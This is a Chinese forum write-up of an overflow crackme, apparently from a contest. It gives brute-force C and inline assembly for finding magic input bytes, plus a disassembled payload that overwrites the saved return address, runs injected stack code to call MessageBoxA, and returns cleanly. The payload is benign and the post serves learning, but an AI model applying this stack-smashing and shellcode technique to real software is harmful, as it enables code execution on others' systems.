
## 溢出分析与穷举

```unsigned para1 = 1; unsigned para2 = 1; unsigned lpara1; unsigned lpara2; while (para1++<0xffffffff) { while (para2++<0xffffffff) { //unsigned 0A5164785h = 0A5164785h; //unsigned 0A5164785h = 5BE6FF82h; __asm{ mov eax,para2 //; 第二参数 //mov ecx,78CC02A8h //; 第四参数 //or ecx,eax //; 或该两个参数？废操作 mov ecx,69948F1Bh //; 第三参数 push ebx //; 保存 ebx mul ecx //; 第三 * 第二 mov ebx,eax //; 结果低 32 位放 ebx mov eax,para1 //; 第一参数 push 78CC02A8h pop esi mul esi //; 第一 * 第四参数 add ebx,eax //; 低 32 位相加 mov eax,para1 //; eax = 第一参数 mul ecx //; 第三 * 第一参数 add edx,ebx //; 进位 + 刚刚低 32 位和 pop ebx mov lpara1,eax mov lpara2,edx } __asm{ mov ecx, 5BE6FF82h // ecx = 第 4;肯定到这儿? mov ebx,0A5164785h // ebx = 第 2 mov edx,lpara2 // edx = 第 3 mov eax,lpara1 // eax = 第 1 参数 again: shr ecx,1 // ; ecx >>=1 rcr ebx,1 // ; 循环右移 shr edx,1 // ; 左边填 0-->最后 edx =1 rcr eax,1 // ; para 1 or ecx,ecx // ; 31 回 jnz again // div ebx push ebx mov ebx,5BE6FF82h // mov ecx,eax // mul ebx // 第四参数 xchg eax,ecx // mul ebx pop ebx add edx,ecx // jb pos1 // cmp edx,lpara2 // para 2 ja pos1 // jb pos2 // cmp eax,lpara1 // para 1 jbe pos2 // pos1: sub eax,0A5164785h // para 3 sbb edx,5BE6FF82h // para 4 pos2: sub eax,lpara1 // para 1 sbb edx,lpara2 // para 2 neg edx // neg eax // 返回值 sbb edx,0 cmp eax,211BB34h jz success } } }`

得到开始 8 个字节后就好做了，栈申请了 `2c` 字节，覆盖掉 `ebp`,`eip` 跳转到自己需要的地方需要在栈上写 `0x34` 字节，即 `D` 个双字，执行代码就是了;)))pdpd。我的代码如下，非常无聊，我没有算到一个其他的入口代码，所以我的入口点必须跳到 `7c` 处才行。开始我也不知道大小和分数有关，我开始的提交后面还有几十个 `0` 没有清除，中间也没有用 `90` 填充，后面第二次提交时上传错了文件，真挫;)) 就明天学习各位大虾的代码;))大家都放出来啊;))

上面说的两种方法，一个是直接修改代码里的数据，另外一个是跳转后直接构造堆。我的就是跳转后直接构造堆栈，调用 `msgbox`，平衡栈底，跳转回去，需要注意的应该就是平衡栈底。调用 `msgbox` 的时候我就是使用的堆里面的数据 `ok!`。注意重定位就是了，具体看代码。另外我的代码很乱，我就随便输入的字符串，然后改的，所以将就看吧;))

### 构造代码

```
003E0000 /EB 7C jmp short 003E007E
003E0002 |CF iretd
003E0003 |45 inc ebp
003E0004 |FA cli
003E0005 |05 E3154F4B add eax,4B4F15E3
003E000A |2100 and dword ptr ds:[eax],eax
003E000C |5F pop edi
003E000D |57 push edi
003E000E |83C7 34 add edi,34
003E0011 |FFE7 jmp edi
003E0013 |00FF add bh,bh
003E0015 |D7 xlat byte ptr ds:[ebx+al]
003E0016 |FD std
003E0017 |1200 adc al,byte ptr ds:[eax]
003E0019 |57 push edi
003E001A |FF15 4C024000 call dword ptr ds:[<&USER32.MessageBoxA>] ; USER32.MessageBoxA
003E0020 |61 popad
003E0021 |6263 64 bound esp,qword ptr ds:[ebx+64]
003E0024 |65:66:67:68 6970 push 7069
003E002A |71 72 jno short 003E009E
003E002C |C4FB les edi,ebx ; 非法使用寄存器
003E002E |1200 adc al,byte ptr ds:[eax]
003E0030 |F5 cmc
003E0031 |0240 00 add al,byte ptr ds:[eax]
003E0034 |8BC6 mov eax,esi ///////////////////////////////////////////////////////
003E0036 |05 08000000 add eax,8
003E003B |0BC9 or ecx,ecx
003E003D |51 push ecx
003E003E |50 push eax
003E003F |50 push eax
003E0040 |51 push ecx
003E0041 |FF15 4C024000 call dword ptr ds:[<&USER32.MessageBoxA>] ; USER32.MessageBoxA
003E0047 |59 pop ecx
003E0048 |59 pop ecx
003E0049 |8BEC mov ebp,esp
003E004B |83C5 14 add ebp,14
003E004E |90 nop
003E004F |90 nop
003E0050 |90 nop
003E0051 |BF 97034000 mov edi,400397
003E0056 |FFE7 jmp edi
003E0058 |66: prefix datasize:
003E0059 |66: prefix datasize:
003E005A |66: prefix datasize:
003E005B |66: prefix datasize:
003E005C |66: prefix datasize:
003E005D |66: prefix datasize:
003E005E |66: prefix datasize:
003E005F |66: prefix datasize:
003E0060 |66: prefix datasize:
003E0061 |66: prefix datasize:
003E0062 |66: prefix datasize:
003E0063 |66: prefix datasize:
003E0064 |66: prefix datasize:
003E0065 |66: prefix datasize:
003E0066 |66: prefix datasize:
003E0067 |66: prefix datasize:
003E0068 |66: prefix datasize:
003E0069 |66: prefix datasize:
003E006A |66: prefix datasize:
003E006B |66: prefix datasize:
003E006C |66: prefix datasize:
003E006D |66: prefix datasize:
003E006E |66: prefix datasize:
003E006F |66:0000 add byte ptr ds:[eax],al
003E0072 |0000 add byte ptr ds:[eax],al
003E0074 |0000 add byte ptr ds:[eax],al
003E0076 |0000 add byte ptr ds:[eax],al
003E0078 |0000 add byte ptr ds:[eax],al
003E007A |0000 add byte ptr ds:[eax],al
003E007C |0000 add byte ptr ds:[eax],al
003E007E \8BC6 mov eax,esi
003E0080 05 34000000 add eax,34
003E0085 FFE0 jmp eax
```

### 总结

总结：这个程序应该说溢出难度不是很大，但是我计算那个开始字节卡壳了，郁闷。哎，熟能生巧，熟能生巧，熟能生巧。我确实这方面搞得少，所以要多做;))另外这个文章写得也郁闷，就当自己的心路历程吧。特别需要注意的是要注意汇编中乘法除法的进位，借位问题。还有些 `rcr`,`sbb` 之类的还要再看。;))

### 穷举代码

```
int main(int argc, char *argv[])
{
 UINT64 i;
 for (i = 0; i<0xffffffff; i++)
 if((unsigned)((i*0x69948F1B) + ~0xd+1)%0xA5164785 ==0 )
 printf("%x\n",i);
 return 0;
}
```

引用:

*最初由 **foxabu**发布* (帖子 352740) `unsigned __int64 initVar = 0;`

```
unsigned __int64 divisor;
divisor = initVar * 0x78CC02A869948F1B;
unsigned __int64 dividend = 0x5BE6FF82A5164785;
...
```

昨天我穷举用的这个,反过来的

```
int main(int argc, char *argv[])
{
UINT64 i;
for (i = 0; i<0xffffffff; i++)
if((unsigned)((i*0x69948F1B) + ~0xd+1)%0xA5164785 ==0 )
 printf("%x\n",i);
 return 0;
}
```

`~0xd+1` 这个地方可以根据我上面介绍的方法修改.这个能得到一个跳转,就是题目中的这个,
另外在 `i` 变化的时候有其他的

跳转你可以看我代码里面的 `opcode`,我用的 `retn`,
